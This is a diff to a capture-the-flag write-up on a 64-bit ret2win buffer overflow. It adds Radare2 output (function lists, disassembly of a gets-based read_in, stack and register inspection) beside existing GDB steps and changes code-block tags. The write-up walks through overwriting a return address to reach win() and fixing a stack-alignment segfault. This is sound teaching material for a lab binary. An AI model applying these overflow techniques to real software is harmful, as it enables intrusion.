@@ -36,7 +36,7 @@ Unsurprisingly, checking the functions list yields us the same result as `win32`
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```bash
 gef➤  info functions
 All defined functions:
 
@@ -61,6 +61,26 @@ Non-debugging symbols:
 {% endtab %}
 
 {% tab title="Radare2" %}
+```bash
+[0x7fb173a34290]> afl
+0x004010b0    1     37 entry0
+0x00403ff0    1     64 reloc.__libc_start_main
+0x004010f0    4     31 sym.deregister_tm_clones
+0x00401120    4     49 sym.register_tm_clones
+0x00401160    3     32 sym.__do_global_dtors_aux
+0x00401190    1      6 sym.frame_dummy
+0x0040122c    1     13 sym._fini
+0x00401196    1     31 sym.win
+0x00401080    1     11 sym.imp.system
+0x004010e0    1      5 sym._dl_relocate_static_pie
+0x004011f3    1     40 main
+0x004011b5    1     62 sym.read_in
+0x00401070    1     11 sym.imp.puts
+0x004010a0    1     11 sym.imp.fflush
+0x00401090    1     11 sym.imp.gets
+0x0040121b    1     14 sym.usefulGadgets
+0x00401000    3     27 sym._init
+```
 {% endtab %}
 {% endtabs %}
 
@@ -68,7 +88,7 @@ We're going straight to `read_in` because we know the contents of `win` and `mai
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```bash
 gef➤  disas read_in
 Dump of assembler code for function read_in:
    0x00000000004011b5 <+0>:	endbr64 
@@ -92,6 +112,30 @@ Dump of assembler code for function read_in:
 {% endtab %}
 
 {% tab title="Radare2" %}
+```bash
+[0x7fb173a34290]> pdf@sym.read_in
+            ; CALL XREF from main @ 0x401200(x)
+┌ 62: sym.read_in ();
+│           ; var int64_t var_30h @ rbp-0x30
+│           0x004011b5      f30f1efa       endbr64
+│           0x004011b9      55             push rbp
+│           0x004011ba      4889e5         mov rbp, rsp
+│           0x004011bd      4883ec30       sub rsp, 0x30
+│           0x004011c1      488d05500e00.  lea rax, str.Can_you_figure_out_how_to_win_here_ ; 0x402018 ; "Can you figure out how to win here?"
+│           0x004011c8      4889c7         mov rdi, rax
+│           0x004011cb      e8a0feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004011d0      488b05712e00.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
+│                                                                      ; [0x404048:8]=0
+│           0x004011d7      4889c7         mov rdi, rax
+│           0x004011da      e8c1feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+│           0x004011df      488d45d0       lea rax, [var_30h]
+│           0x004011e3      4889c7         mov rdi, rax
+│           0x004011e6      b800000000     mov eax, 0
+│           0x004011eb      e8a0feffff     call sym.imp.gets           ; char *gets(char *s)
+│           0x004011f0      90             nop
+│           0x004011f1      c9             leave
+└           0x004011f2      c3             ret
+```
 {% endtab %}
 {% endtabs %}
 
@@ -122,7 +166,7 @@ Since this is 64-bit, parameters are passed via the register. We know that `gets
 
 If we check the last data that was passed to `rdi` before `gets` is called, this is where we write. We find that this line is the last update to `rdi`:
 
-```as
+```bash
 0x00000000004011df <+42>:	lea    rax,[rbp-0x30]
 0x00000000004011e3 <+46>:	mov    rdi,rax
 ```
@@ -135,21 +179,26 @@ Getting the offset is the same in 64-bit as 32-bit. Let's put a breakpoint right
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```bash
 gef➤  b *(read_in+54)
 gef➤  run
 ```
 {% endtab %}
 
 {% tab title="Radare2" %}
-
+```bash
+[0x7f7db482e290]> db 0x4011eb
+[0x7f7db482e290]> dc
+Can you figure out how to win here?
+INFO: hit breakpoint at: 0x4011eb
+```
 {% endtab %}
 {% endtabs %}
 
 
 Find the address of the return pointer by checking the instruction after the `call` to `read_in`:
 
-```as
+```bash
 0x0000000000401200 <+13>:	call   0x4011b5 <read_in>
 0x0000000000401205 <+18>:	lea    rax,[rip+0xe30]        # 0x40203c
 ```
@@ -160,7 +209,7 @@ Let's check what's on the stack:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```bash
 gef➤  x/10gx $rsp
 0x7fffffffe450:	0x0000000000000000	0x0000000000000000
 0x7fffffffe460:	0x0000000000000000	0x0000000000000000
@@ -171,7 +220,14 @@ gef➤  x/10gx $rsp
 {% endtab %}
 
 {% tab title="Radare2" %}
-
+```bash
+[0x004011eb]> pxq 80@rsp
+0x7ffd543e9280  0x0000000000000000  0x0000000000000000   ................
+0x7ffd543e9290  0x0000000000000000  0x0000000000000000   ................
+0x7ffd543e92a0  0x0000000000000000  0x0000000000000000   ................
+0x7ffd543e92b0  0x00007ffd543e92c0  0x0000000000401205   ..>T......@.....
+0x7ffd543e92c0  0x0000000000000001  0x00007f7db4429d90   ..........B.}...
+```
 {% endtab %}
 {% endtabs %}
 
@@ -179,14 +235,17 @@ We see that the return pointer is there:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```bash
 gef➤  x/gx 0x7fffffffe488
 0x7fffffffe488:	0x0000000000401205
 ```
 {% endtab %}
 
 {% tab title="Radare2" %}
-
+```bash
+[0x004011eb]> pxq 8 @ 0x7ffd543e92b8
+0x7ffd543e92b8  0x0000000000401205                       ..@.....
+```
 {% endtab %}
 {% endtabs %}
 
@@ -195,14 +254,17 @@ Checking `rdi` shows us where we will start writing:
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```bash
 gef➤  p/x $rdi
 $1 = 0x7fffffffe450
 ```
 {% endtab %}
 
 {% tab title="Radare2" %}
-
+```bash
+[0x004011eb]> dr rdi
+0x7ffd543e9280
+```
 {% endtab %}
 {% endtabs %}
 
@@ -267,7 +329,7 @@ This is going to set a breakpoint right before the `gets()` call (which we did m
 
 If we reach the end of `read_in`, we notice, based on the execution flow, that it intends to go to `win()`:
 
-```
+```bash
      0x4011eb <read_in+54>     call   0x401090 <gets@plt>
      0x4011f0 <read_in+59>     nop    
      0x4011f1 <read_in+60>     leave  
@@ -282,19 +344,19 @@ If we reach the end of `read_in`, we notice, based on the execution flow, that i
 
 Using `ni`, we see that the program successfully makes it to `win()`. Our payload successfully takes us to the right place! If we continue execution to let it print the flag, we see that it segfaults:
 
-```as
+```bash
 [#0] Id 1, Name: "win64", stopped 0x7fc438850963 in __sigemptyset (), reason: SIGSEGV
 ```
 
 We notice that it stops on the `movaps` instruction inside of `do_system`:
 
-```as
+```bash
  → 0x7fc438850963 <do_system+115>  movaps XMMWORD PTR [rsp], xmm1
 ```
 
 From the call trace, we see that this is called from `win()` calling `system()`, as expected:
 
-```as
+```bash
 [#0] 0x7fc438850963 → __sigemptyset(set=<optimized out>)
 [#1] 0x7fc438850963 → do_system(line=0x402008 "cat flag.txt")
 [#2] 0x4011b2 → win()
@@ -306,7 +368,7 @@ How can we fix this? We can add `8` bytes to the payload, which will make it `64
 
 {% tabs %}
 {% tab title="GDB" %}
-```as
+```bash
 gef➤  disas deregister_tm_clones
 Dump of assembler code for function deregister_tm_clones:
    0x00000000004010f0 <+0>:	mov    eax,0x404048
@@ -323,7 +385,24 @@ Dump of assembler code for function deregister_tm_clones:
 {% endtab %}
 
 {% tab title="Radare2" %}
-
+```bash
+[0x004011eb]> pdf@sym.deregister_tm_clones
+            ; CALL XREF from sym.__do_global_dtors_aux @ 0x401171(x)
+┌ 31: sym.deregister_tm_clones ();
+│           0x004010f0      b848404000     mov eax, obj.stdout         ; obj.__TMC_END__
+│                                                                      ; 0x404048
+│           0x004010f5      483d48404000   cmp rax, obj.stdout         ; obj.__TMC_END__
+│                                                                      ; 0x404048
+│       ┌─< 0x004010fb      7413           je 0x401110
+│       │   0x004010fd      b800000000     mov eax, 0
+│       │   0x00401102      4885c0         test rax, rax
+│      ┌──< 0x00401105      7409           je 0x401110
+│      ││   0x00401107      bf48404000     mov edi, obj.stdout         ; obj.__TMC_END__
+│      ││                                                              ; 0x404048
+│      ││   0x0040110c      ffe0           jmp rax
+..
+└      └└─> 0x00401110      c3             ret
+```
 {% endtab %}
 {% endtabs %}
 
